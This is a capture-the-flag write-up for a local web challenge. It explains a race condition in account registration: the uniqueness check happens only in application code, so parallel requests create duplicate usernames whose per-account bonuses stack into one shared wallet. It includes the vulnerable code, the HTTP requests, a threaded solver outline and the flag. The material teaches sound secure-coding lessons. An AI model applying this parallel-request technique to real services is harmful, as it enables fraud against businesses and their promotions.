# Mario Kart Writeup

## Idea

The goal is to buy the `Rainbow Road Golden Kart`. A new account can claim a
`$10.00` garage bonus once, but the kart costs `$42.00`, so one normal account
cannot afford it.

The intended bug is a race condition in account creation. The developer assumed
that usernames were unique, and tried to enforce that assumption in application
code. The database does not actually enforce uniqueness, so concurrent register
requests can create multiple accounts with the same username.

Each account can claim the bonus once, but the wallet is calculated by username.
That means duplicate accounts with the same username all add money to the same
wallet.

## Vulnerable Code

Registration checks whether a username already exists before inserting the new
account:

```python
def create_account(username: str, password: str) -> tuple[dict[str, Any], int]:
    username = normalize_username(username)

    if len(password) < 4:
        return {"ok": False, "error": "password must be at least 4 chars"}, 400

    if get_user_by_username(username):
        return {"ok": False, "error": "username already exists"}, 409

    password_hash = generate_password_hash(password)
    user_id = create_user(username, password_hash)
```

The lookup only returns one user:

```python
def get_user_by_username(username: str) -> sqlite3.Row | None:
    with connect_db() as db:
        return db.execute(
            "SELECT id, username, password_hash, bonus_claimed FROM users WHERE username = ? LIMIT 1",
            (username,),
        ).fetchone()
```

This makes the code look like there can only be one account for a username. The
mistake is that `get_user_by_username()` and `create_user()` are separate
database operations. There is a small window where many requests can all see
"no user exists yet" and then all insert the same username.

The database schema allows this because `username` is not unique:

```sql
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    bonus_claimed INTEGER NOT NULL DEFAULT 0,
    created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
);
```

There is no `UNIQUE(username)` constraint.

## Why The Bonus Stacks

The bonus is only limited per account:

```python
if user["bonus_claimed"]:
    db.execute("ROLLBACK")
    raise AlreadyClaimedError

db.execute("UPDATE users SET bonus_claimed = 1 WHERE id = ?", (user["id"],))
```

That means account `id=1` can claim once, account `id=2` can claim once, and so
on.

But the wallet ledger is grouped by username:

```python
INSERT INTO wallet_ledger (wallet_owner, user_id, amount_cents)
VALUES (?, ?, ?)
```

with:

```python
(user["username"], user["id"], bonus_cents)
```

The wallet balance is also calculated by username:

```python
SELECT ? AS wallet_owner, COALESCE(SUM(amount_cents), 0) AS balance_cents
FROM wallet_ledger
WHERE wallet_owner = ?
```

So if five accounts have the same username, each one can claim `$10.00`, and
the shared username wallet reaches `$50.00`.

The kart costs `$42.00`, so five successful duplicate accounts are enough.

## Solve Steps

1. Choose a fresh username.

2. Send many `POST /register` requests at the same time with that exact same
   username (can be done using burpsuite send group in parallel feature or by code).

Example request:

```http
POST /register HTTP/1.1
Host: 127.0.0.1:9797
Accept: application/json
Content-Type: application/json

{"username":"race123","password":"testpass"}
```

3. Keep the `session` cookie from every successful `201` response.

Each response represents a different account with the same username.

4. Use each successful account cookie once to claim the bonus:

```http
POST /claim HTTP/1.1
Host: 127.0.0.1:9797
Accept: application/json
Content-Type: application/json
Cookie: session=<cookie from one registered account>

{}
```

A successful claim returns:

```json
{ "message": "garage bonus claimed", "ok": true }
```

5. After at least five duplicate accounts claim the bonus, buy the kart:

```http
POST /purchase HTTP/1.1
Host: 127.0.0.1:9797
Accept: application/json
Content-Type: application/json
Cookie: session=<any duplicate account cookie>

{"item":"rainbow-road-golden-kart"}
```

The response contains the flag:

```json
{ "flag": "ingehack{4s_yoU_saw_R3QueST$_rACE_4S_gOod_a$_C4rS}", "ok": true }
```

## Using The Provided Solver

Run the challenge:

```sh
docker compose up --build
```

Then run:

```sh
python solve.py
```

The solver uses `ThreadPoolExecutor` and a `Barrier` so all registration
requests start together:

```python
barrier = Barrier(ACCOUNT_COUNT)
futures = [pool.submit(register_account, barrier, username, i) for i in range(ACCOUNT_COUNT)]
```

Each thread registers the same username but keeps its own cookie jar:

```python
opener = build_opener(HTTPCookieProcessor(CookieJar()))
```

That is important because each duplicate account needs its own `session` cookie
to claim the bonus once.
